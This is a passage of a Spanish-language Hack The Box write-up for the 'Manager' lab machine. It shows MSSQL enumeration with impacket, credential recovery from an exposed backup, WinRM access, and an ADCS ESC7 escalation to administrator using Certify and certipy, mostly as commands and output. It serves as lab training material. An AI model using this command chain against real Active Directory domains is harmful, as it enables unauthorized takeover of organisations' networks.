</span></span></span></code></pre></div><p>y veo que las credenciales <code>operator:operator</code> tambi√©n funcionan para este servicio</p><ul><li>Ahora usar√© <code>impacket-mssqlclient</code> de la librer√≠a <code>Impacket</code> con esta credencial:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ impacket-mssqlclient managet.htb/operator:&#39;operator&#39;@10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go>Impacket v0.11.0 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Encryption required, switching to TLS
</span></span></span><span class=line><span class=cl><span class=go>[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user &#39;operator&#39;.
</span></span></span></code></pre></div><p>y no funciona. Pero si agrego la flag <code>-windows-auth</code> s√≠ funciona:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ impacket-mssqlclient managet.htb/operator:&#39;operator&#39;@10.10.11.236 -windows-auth
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.11.0 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Encryption required, switching to TLS
</span></span></span><span class=line><span class=cl><span class=go>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
</span></span></span><span class=line><span class=cl><span class=go>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
</span></span></span><span class=line><span class=cl><span class=go>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
</span></span></span><span class=line><span class=cl><span class=go>[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
</span></span></span><span class=line><span class=cl><span class=go>[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
</span></span></span><span class=line><span class=cl><span class=go>[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
</span></span></span><span class=line><span class=cl><span class=go>[!] Press help for extra shell commands
</span></span></span><span class=line><span class=cl><span class=go>SQL (MANAGER\Operator  guest@master)&gt;
</span></span></span></code></pre></div><ul><li>Trato de ejecutar comandos usando <code>xp_cmdshell</code>, pero no puedo. Tampoco se me permite &ldquo;activar&rdquo; las opciones para correr <code>xp_cmdshell</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SQL (MANAGER\Operator  guest@master)&gt; xp_cmdshell whoami
</span></span></span><span class=line><span class=cl><span class=go>[-] ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object &#39;xp_cmdshell&#39;, database &#39;mssqlsystemresource&#39;, schema &#39;sys&#39;.
</span></span></span><span class=line><span class=cl><span class=go>SQL (MANAGER\Operator  guest@master)&gt; enable_xp_cmdshell
</span></span></span><span class=line><span class=cl><span class=go>[-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
</span></span></span><span class=line><span class=cl><span class=go>[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
</span></span></span><span class=line><span class=cl><span class=go>[-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option &#39;xp_cmdshell&#39; does not exist, or it may be an advanced option.
</span></span></span><span class=line><span class=cl><span class=go>[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
</span></span></span><span class=line><span class=cl><span class=go>SQL (MANAGER\Operator  guest@master)&gt;
</span></span></span></code></pre></div><ul><li>Luego de jugar con algunos parametros (y luego de seguir algunas instrucciones de <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server class=external-link target=_blank rel=noopener>HackTricks Pentesting MSSQL</a>) encuentro algo curioso. Dado que ten√≠amos un servicio/servidor <code>HTTP</code> puede que haya un directorio localizado en <code>C:\inetpub\wwwroot</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SQL (MANAGER\Operator  guest@master)&gt; EXEC xp_dirtree &#39;C:\inetpub\wwwroot&#39;, 1, 1;
</span></span></span><span class=line><span class=cl><span class=go>subdirectory                      depth   file
</span></span></span><span class=line><span class=cl><span class=go>-------------------------------   -----   ----
</span></span></span><span class=line><span class=cl><span class=go>about.html                            1      1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>contact.html                          1      1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>css                                   1      0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>images                                1      0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>index.html                            1      1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>js                                    1      0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>service.html                          1      1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>web.config                            1      1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>website-backup-27-07-23-old.zip       1      1
</span></span></span></code></pre></div><p>Aparentemente, estos archivos est√°n p√∫blicos en la p√°gina web con protocolo <code>HTTP</code>. Adem√°s, noto que hay un archivo bastante inusual y curioso: <code>website-backup-27-07-23-old.zip</code></p><ul><li>De manera que descargo el archivo con el comando <code>wget</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget http://10.10.11.236/website-backup-27-07-23-old.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-03-11 22:15:14--  http://10.10.11.236/website-backup-27-07-23-old.zip
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.11.236:80... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 1045328 (1021K) [application/x-zip-compressed]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòwebsite-backup-27-07-23-old.zip‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>website-backup-27-07-23-old.zip            100%[=======================================================================================&gt;]   1021K   518KB/s    in 2.0s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-03-11 22:15:16 (518 KB/s) - ‚Äòwebsite-backup-27-07-23-old.zip‚Äô saved [1045328/1045328]
</span></span></span></code></pre></div><ul><li>Muevo este archivo descargado en un nuevo directorio y unzipeo/extraigo los archivos contenidos dentro de √©ste:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ mkdir backup_found
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ mv website-backup-27-07-23-old.zip backup_found
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cd backup_found
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ unzip website-backup-27-07-23-old.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Archive:  website-backup-27-07-23-old.zip
</span></span></span><span class=line><span class=cl><span class=go>  inflating: .old-conf.xml
</span></span></span><span class=line><span class=cl><span class=go>  inflating: about.html
</span></span></span><span class=line><span class=cl><span class=go>  inflating: contact.html
</span></span></span><span class=line><span class=cl><span class=go>  inflating: css/bootstrap.css
</span></span></span><span class=line><span class=cl><span class=go>  inflating: css/responsive.css
</span></span></span><span class=line><span class=cl><span class=go>  inflating: css/style.css
</span></span></span><span class=line><span class=cl><span class=go>  inflating: css/style.css.map
</span></span></span><span class=line><span class=cl><span class=go>  inflating: css/style.scss
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/about-img.png
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/body_bg.jpg
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/call.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/call-o.png
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/client.jpg
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/contact-img.jpg
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/envelope.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/envelope-o.png
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/hero-bg.jpg
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/location.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/location-o.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/logo.png
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/menu.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/next.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/next-white.png
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/offer-img.jpg
</span></span></span><span class=line><span class=cl><span class=go>  inflating: images/prev.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/prev-white.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/quote.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/s-1.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/s-2.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/s-3.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/s-4.png
</span></span></span><span class=line><span class=cl><span class=go> extracting: images/search-icon.png
</span></span></span><span class=line><span class=cl><span class=go>  inflating: index.html
</span></span></span><span class=line><span class=cl><span class=go>  inflating: js/bootstrap.js
</span></span></span><span class=line><span class=cl><span class=go>  inflating: js/jquery-3.4.1.min.js
</span></span></span><span class=line><span class=cl><span class=go>  inflating: service.html
</span></span></span></code></pre></div><ul><li>Entre estos archivos puedo ver un archivo llamado <code>.old-conf.xml</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1092
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 gunzf0x gunzf0x    4096 Mar 11 22:18 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x    4096 Mar 11 22:18 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    5386 Jul 27  2023 about.html
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    5317 Jul 27  2023 contact.html
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x    4096 Mar 11 22:18 css
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x    4096 Mar 11 22:18 images
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x   18203 Jul 27  2023 index.html
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x    4096 Mar 11 22:18 js
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x     698 Jul 27  2023 .old-conf.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    7900 Jul 27  2023 service.html
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 1045328 Jul 27  2023 website-backup-27-07-23-old.zip
</span></span></span></code></pre></div><p>el cual, si lo leemos, contiene credenciales:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;ldap-conf</span> <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;server&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;host&gt;</span>dc01.manager.htb<span class=nt>&lt;/host&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;open-port</span> <span class=na>enabled=</span><span class=s>&#34;true&#34;</span><span class=nt>&gt;</span>389<span class=nt>&lt;/open-port&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;secure-port</span> <span class=na>enabled=</span><span class=s>&#34;false&#34;</span><span class=nt>&gt;</span>0<span class=nt>&lt;/secure-port&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;search-base&gt;</span>dc=manager,dc=htb<span class=nt>&lt;/search-base&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;server-type&gt;</span>microsoft<span class=nt>&lt;/server-type&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;access-user&gt;</span>
</span></span><span class=line><span class=cl>         <span class=nt>&lt;user&gt;</span>raven@manager.htb<span class=nt>&lt;/user&gt;</span>
</span></span><span class=line><span class=cl>         <span class=nt>&lt;password&gt;</span>R4v3nBe5tD3veloP3r!123<span class=nt>&lt;/password&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/access-user&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;uid-attribute&gt;</span>cn<span class=nt>&lt;/uid-attribute&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/server&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;search</span> <span class=na>type=</span><span class=s>&#34;full&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;dir-list&gt;</span>
</span></span><span class=line><span class=cl>         <span class=nt>&lt;dir&gt;</span>cn=Operator1,CN=users,dc=manager,dc=htb<span class=nt>&lt;/dir&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/dir-list&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/search&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/ldap-conf&gt;</span>
</span></span></code></pre></div><p>de manera que hallamos una credencial: <code>raven:R4v3nBe5tD3veloP3r!123</code>. Noto que el usuario <code>raven</code> hab√≠a sido previamente encontrado con los scans de <code>Kerbrute</code> y con el comando <code>rpcclient</code> <code>enumdomusers</code>, de manera que este usuario deber√≠a de existir en la m√°quina v√≠ctima.</p><ul><li>Chequeo si me puedo conectar a la m√°quina v√≠ctima via <code>WinRM</code> con esta credencial:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.236 -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
</span></span></span></code></pre></div><p>y, ya que las credenciales son v√°lidas, me conecto a la m√°quina v√≠ctima usando <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 10.10.11.236 -u &#39;raven&#39; -p &#39;R4v3nBe5tD3veloP3r!123&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Raven\Documents&gt;
</span></span></span></code></pre></div><p>Podemos obtener la flag de usuario en el Desktop de <code>Raven</code></p><h2 id=nt-authoritysystem---administrator--administrador>NT Authority/System - Administrator / Administrador
<a class=heading-link href=#nt-authoritysystem---administrator--administrador><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Chequeo mis grupos como <code>Raven</code> en la m√°quina v√≠ctima, pero nada interesante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Raven\Documents&gt; net user Raven
</span></span></span><span class=line><span class=cl><span class=go>User name                    Raven
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               Yes
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            7/27/2023 8:23:10 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             Never
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          7/28/2023 8:23:10 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   3/12/2024 1:19:39 AM
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Remote Management Use
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Domain Users
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><ul><li>Luego de buscar algunas vulnerabilidades y servicios corriendo en el sistema, no hallo nada muy interesante. De manera que decido chequear los certificados que puedan haber en esta m√°quina. Para esto decido usar un binario de <code>Certify.exe</code> (el cual podemos descargar desde <a href=https://github.com/depradip/Ghostpack_CompiledBinaries/tree/main/Ghostpack-CompiledBinaries class=external-link target=_blank rel=noopener>su repositorio de Github</a>), y subirlo a la m√°quina con <code>evil-winrm</code>. Esto lo hacemos para chequear si <code>Active Directory Certificate Services (ADCS)</code> est√° corriendo en la m√°quina:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Raven\Documents&gt; upload ../exploits/Certify.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/HTB/HTBMachines/Medium/Manager/content/../exploits/Certify.exe to C:\Users\Raven\Documents\Certify.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 232104 bytes of 232104 bytes copied
</span></span></span></code></pre></div><p>lo ejecutamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Raven\Documents&gt; .\Certify.exe find -vulnerable
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>   _____          _   _  __
</span></span></span><span class=line><span class=cl><span class=go>  / ____|        | | (_)/ _|
</span></span></span><span class=line><span class=cl><span class=go> | |     ___ _ __| |_ _| |_ _   _
</span></span></span><span class=line><span class=cl><span class=go> | |    / _ \ &#39;__| __| |  _| | | |
</span></span></span><span class=line><span class=cl><span class=go> | |___|  __/ |  | |_| | | | |_| |
</span></span></span><span class=line><span class=cl><span class=go>  \_____\___|_|   \__|_|_|  \__, |
</span></span></span><span class=line><span class=cl><span class=go>                             __/ |
</span></span></span><span class=line><span class=cl><span class=go>                            |___./
</span></span></span><span class=line><span class=cl><span class=go>  v1.0.0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Action: Find certificate templates
</span></span></span><span class=line><span class=cl><span class=go>[*] Using the search base &#39;CN=Configuration,DC=manager,DC=htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Listing info about the Enterprise CA &#39;manager-DC01-CA&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Enterprise CA Name            : manager-DC01-CA
</span></span></span><span class=line><span class=cl><span class=go>    DNS Hostname                  : dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>    FullName                      : dc01.manager.htb\manager-DC01-CA
</span></span></span><span class=line><span class=cl><span class=go>    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
</span></span></span><span class=line><span class=cl><span class=go>    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
</span></span></span><span class=line><span class=cl><span class=go>    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
</span></span></span><span class=line><span class=cl><span class=go>    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
</span></span></span><span class=line><span class=cl><span class=go>    Cert Start Date               : 7/27/2023 3:21:05 AM
</span></span></span><span class=line><span class=cl><span class=go>    Cert End Date                 : 7/27/2122 3:31:04 AM
</span></span></span><span class=line><span class=cl><span class=go>    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
</span></span></span><span class=line><span class=cl><span class=go>    UserSpecifiedSAN              : Disabled
</span></span></span><span class=line><span class=cl><span class=go>    CA Permissions                :
</span></span></span><span class=line><span class=cl><span class=go>      Owner: BUILTIN\Administrators        S-1-5-32-544
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>      Access Rights                                     Principal
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
</span></span></span><span class=line><span class=cl><span class=go>      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
</span></span></span><span class=line><span class=cl><span class=go>      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
</span></span></span><span class=line><span class=cl><span class=go>      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class=line><span class=cl><span class=go>      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class=line><span class=cl><span class=go>      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
</span></span></span><span class=line><span class=cl><span class=go>      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
</span></span></span><span class=line><span class=cl><span class=go>    Enrollment Agent Restrictions : None
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Veo que el usuario <code>Raven</code> tiene <code>Allow ManageCA</code> activado, de manera que podemos tratar de atacar por este lado.</p><ul><li>Noto que hay un template con nombre <code>SubCA</code>, de manera que puede ser vulnerable a <a href=https://github.com/ly4k/Certipy#esc7 class=external-link target=_blank rel=noopener>ESC7, tal cual est√° explicado en la p√°gina de &lsquo;certipy&rsquo;</a>. Seguimos las instrucciones de la p√°gina web.</li><li>Usando <code>Certipy</code> tratamos de jugar con los certificados para hacer la escalada de privilegios:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ certipy ca -ca &#39;manager-DC01-CA&#39; -add-officer raven -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39;
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Successfully added officer &#39;Raven&#39; on &#39;manager-DC01-CA&#39;
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ certipy ca -ca &#39;manager-DC01-CA&#39; -enable-template SubCA -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39;
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Successfully enabled &#39;SubCA&#39; on &#39;manager-DC01-CA&#39;
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target manager.htb -template SubCA -upn administrator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting certificate via RPC
</span></span></span><span class=line><span class=cl><span class=go>[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class=line><span class=cl><span class=go>[*] Request ID is 13
</span></span></span><span class=line><span class=cl><span class=go>Would you like to save the private key? (y/N) y
</span></span></span><span class=line><span class=cl><span class=go>[*] Saved private key to 13.key
</span></span></span><span class=line><span class=cl><span class=go>[-] Failed to request certificate
</span></span></span></code></pre></div><p>pero cuando solicito el certificado, √©ste falla&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ certipy ca -ca &#34;manager-DC01-CA&#34; -issue-request 13 -username &#39;raven@manager.htb&#39; -password &#39;R4v3nBe5tD3veloP3r!123&#39;
</span></span></span><span class=line><span class=cl><span class=go>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span></span></code></pre></div><p>incluso si, como podemos ver, el par√°metro <code>-issue-request</code> pide por un <code>id</code>, el cual es <code>13</code> en mi caso (puede que en el suyo sea distinto). Esto se puede ver en los comandos de un poquito m√°s arriba.</p><ul><li>No obstante, si corro todos los comandos de nuevo, pero esta vez en una sola l√≠nea, s√≠ funciona:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ certipy ca -ca &#39;manager-DC01-CA&#39; -add-officer raven -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; &amp;&amp; certipy ca -ca &#39;manager-DC01-CA&#39; -enable-template SubCA -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; &amp;&amp; certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#39;manager-DC01-CA&#39; -target manager.htb -template SubCA -upn administrator@manager.htb &amp;&amp; certipy ca -ca &#34;manager-DC01-CA&#34; -issue-request 13 -username &#39;raven@manager.htb&#39; -password &#39;R4v3nBe5tD3veloP3r!123&#39; &amp;&amp; certipy req -username &#39;raven@manager.htb&#39; -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca &#34;manager-DC01-CA&#34; -target manager.htb -retrieve 13
